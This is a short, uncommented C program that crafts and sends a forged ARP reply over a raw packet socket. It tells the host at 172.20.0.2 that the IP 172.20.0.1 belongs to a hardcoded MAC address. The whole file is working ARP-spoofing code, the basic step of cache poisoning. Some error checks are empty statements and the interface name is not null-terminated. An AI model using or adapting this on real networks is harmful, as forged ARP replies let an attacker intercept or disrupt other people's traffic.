#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <net/ethernet.h>
#include <net/if.h>
#include <linux/if.h>
#include <netinet/if_ether.h>
#include <netpacket/packet.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
int main()
{
	int sock;
	sock = socket(AF_PACKET, SOCK_DGRAM, htons(ETH_P_RARP));
	if(sock < 0)
	{
		perror("socket\n");
	}
	struct ifreq ifr;
	char *a="wlp1s0";

	size_t if_len = strlen(a);
	memcpy(ifr.ifr_name, a, if_len);

	ioctl(sock, SIOCGIFINDEX, &ifr);

	int ifindex = ifr.ifr_ifindex;
	char target_addr[] = {0xd0, 0x04, 0x01, 0x63, 0x34, 0x4a};
	
	struct sockaddr_ll addr = {0};
	addr.sll_family = AF_PACKET;
	addr.sll_ifindex = ifindex;
	addr.sll_halen = ETHER_ADDR_LEN;
	addr.sll_protocol = htons(ETH_P_ARP);
	memcpy(addr.sll_addr, target_addr, ETHER_ADDR_LEN);

	struct ether_arp req;
	req.arp_hrd = htons(ARPHRD_ETHER);
	req.arp_pro = htons(ETH_P_IP);
	req.arp_hln = ETHER_ADDR_LEN;
	req.arp_pln = sizeof(in_addr_t);
	req.arp_op = htons(2);
	memset(&req.arp_tha, 0, sizeof(req.arp_tha));
	req.arp_tha[0] = 0xd0;
	req.arp_tha[1] = 0x04;
	req.arp_tha[2] = 0x01;
	req.arp_tha[3] = 0x63;
	req.arp_tha[4] = 0x34;
	req.arp_tha[5] = 0x4a;

	char *target_ip = "172.20.0.2";
	struct in_addr target_ip_addr = {0};
	if(!inet_aton(target_ip, &target_ip_addr));

	memcpy(&req.arp_tpa, &target_ip_addr.s_addr, sizeof(req.arp_tpa));

	req.arp_sha[0] = 0xf8;
	req.arp_sha[1] = 0xda;
	req.arp_sha[2] = 0x0c;
	req.arp_sha[3] = 0x53;
	req.arp_sha[4] = 0x3f;
	req.arp_sha[5] = 0x4f;


	char *source_ip = "172.20.0.1";
	struct in_addr source_ipaddr = {0};

	if(!inet_aton(source_ip, &source_ipaddr));

	memcpy(&req.arp_spa, &source_ipaddr.s_addr, sizeof(req.arp_spa));


	sendto(sock, &req,sizeof(req),0,(struct sockaddr*)&addr,sizeof(addr));
}
